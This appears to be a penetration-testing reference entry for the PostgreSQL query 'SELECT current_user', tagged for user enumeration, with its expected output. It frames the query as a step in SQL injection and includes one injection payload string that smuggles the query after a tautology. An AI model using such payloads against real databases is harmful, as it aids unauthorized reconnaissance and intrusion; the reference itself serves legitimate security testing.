---
type: command
executor: sql
data: SELECT current_user;
tags:
  - postgresql
  - user-enumeration
  - discovery
platforms:
  - Database
  - PostgreSQL
verified: true
validated: true
---

# postgresql-select-current-user

## Command

```sql
SELECT current_user;
```

## Description

This SQL command retrieves the name of the user currently executing statements in the PostgreSQL session. It is essential for SQL injection attacks to determine the effective privileges of the compromised context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No parameters; executes directly in the session | Yes |

## Examples

### Basic Usage

```sql
SELECT current_user;
```

### In Injection Payload

```sql
' OR 1=1; SELECT current_user; --
```

## Expected Output

A single row with the username, e.g.:

```
 current_user 
--------------
 postgres
(1 row)
```

## Related

- [[procedures/PostgreSQL-Current-User-Information-Gathering]]
- [[commands/postgresql-select-session-user]]
